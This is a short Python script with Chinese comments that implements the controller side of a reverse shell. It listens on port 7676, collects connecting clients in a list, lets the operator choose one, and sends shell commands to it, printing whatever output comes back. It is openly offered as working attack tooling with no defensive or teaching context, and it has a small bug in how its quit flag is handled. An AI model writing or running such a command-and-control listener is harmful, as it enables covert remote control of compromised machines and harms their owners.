#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
from collections import namedtuple

client = namedtuple('Client', 'sock ip')
clientList = []             #连接的客户端列表
curClient = None            #当前的客户端
quitThread = False          #是否退出线程
lock = threading.Lock()

def shell_ctrl(socket,ip):
    while True:
        com = input(str(ip) + ':~#')
        if com == '!ch':
            select_client()
            return
        if com == '!q':
            quitThread = True
            print('-----------------------* Connection has ended *--------------------------')
            exit(0)
        socket.send(com.encode('utf-8'))
        data = socket.recv(1024)
        print(data.decode('utf-8'))
        while len(data) == 1024:
            data = socket.recv(1024)
            print(data.decode('utf-8'))


def select_client():
    global clientList
    global curClient
    print('--------------* The current is connected to the client: *----------------')
    for i in range(len(clientList)):
        print('[%i]-> %s' % (i, str(clientList[i].ip)))
    print('Please select a client!')

    while True:
        num = input('client num:')
        if int(num) >= len(clientList):
            print('Please input a correct num!')
            continue
        else:
            break

    curClient = clientList[int(num)]

    print('=' * 80)
    print(' ' * 20 + 'Client Shell from addr:', curClient.ip)
    print('=' * 80)

def wait_connect(sk):
    global clientList
    while not quitThread:
        if len(clientList) == 0:
            print('Waiting for the connection......')
        sock, (ip, port) = sk.accept()
        print('New client %s is connection!' % ip)
        lock.acquire()
        c = client(sock, ip)
        clientList.append(c)
        lock.release()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',7676))
    s.listen(1024)

    t = threading.Thread(target=wait_connect,args=(s,))
    t.start()

    while True:
        if len(clientList) > 0:
            select_client()  # 选择一个客户端
            shell_ctrl(curClient.sock,curClient.ip) #处理shell命令



if __name__ == '__main__':
    main()
